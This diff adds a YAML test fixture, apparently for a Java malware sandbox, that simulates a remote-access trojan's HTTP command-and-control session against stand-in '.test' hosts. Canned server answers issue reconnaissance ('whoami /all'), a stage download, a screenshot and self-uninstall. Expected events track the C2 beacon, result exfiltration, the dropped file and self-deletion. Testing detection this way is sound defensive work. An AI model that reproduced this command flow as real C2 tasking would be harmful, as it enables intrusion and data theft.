@@ -1,0 +1,30 @@
+description: An HTTP command-and-control session driven entirely by canned server answers.
+techniques: [string-decryption, http-c2, http-rules, command-execution, file-download, blocked-gui, self-delete, system-exit]
+fixture: dev.javabyte.guest.sim.HttpRat
+stages:
+  - name: session
+    config:
+      network:
+        http:
+          - {url: '/task\?id=\w+&n=1$', body: 'exec whoami /all'}
+          - {url: '/task\?id=\w+&n=2$', body: 'download http://cdn.rat.test/stage.bin C:\Users\Public\stage.bin'}
+          - {url: '/task\?id=\w+&n=3$', body: screenshot}
+          - {url: '/task\?id=\w+&n=4$', body: uninstall}
+          - {url: 'cdn\.rat\.test/stage\.bin', bodyBase64: TVqQAAMAAAAEAAAA}
+      processes:
+        - {command: whoami, stdout: "desktop\\admin\n"}
+    expect:
+      outcomes: [exit]
+      stdout: [uninstalled]
+      events:
+        - {category: string, action: returned, where: {value: '^http://c2\.rat\.test:8080$'}, because: the decrypted server address must show up without any analysis effort}
+        - {category: net, action: http, where: {method: POST, url: '/register$', requestBodyPreview: 'id=[0-9a-f]{8}&os=Windows 10&user=admin@DESKTOP'}}
+        - {category: net, action: http, where: {url: '/task\?id=', requestHeaders: 'Mozilla/5\.0 \(rat\)'}, min: 4}
+        - {category: process, action: exec, where: {command: '^cmd\.exe /c whoami /all$'}}
+        - {category: net, action: http, where: {url: '/result\?n=1$', requestBodyPreview: 'desktop\\admin'}, because: canned process output must flow back to the server}
+        - {category: file, action: write, where: {path: 'C:\\Users\\Public\\stage\.bin$', size: '^12$'}}
+        - {category: net, action: http, where: {url: '/result\?n=2$', requestBodyPreview: 'saved 12'}}
+        - {category: policy, action: blocked, where: {member: 'java/awt/Robot'}}
+        - {category: net, action: http, where: {url: '/result\?n=3$'}}
+        - {category: file, action: delete, where: {path: 'httprat\.jar$', existed: 'true'}}
+      artifacts: ['dropped/.*stage\.bin$', 'network/http-request-']
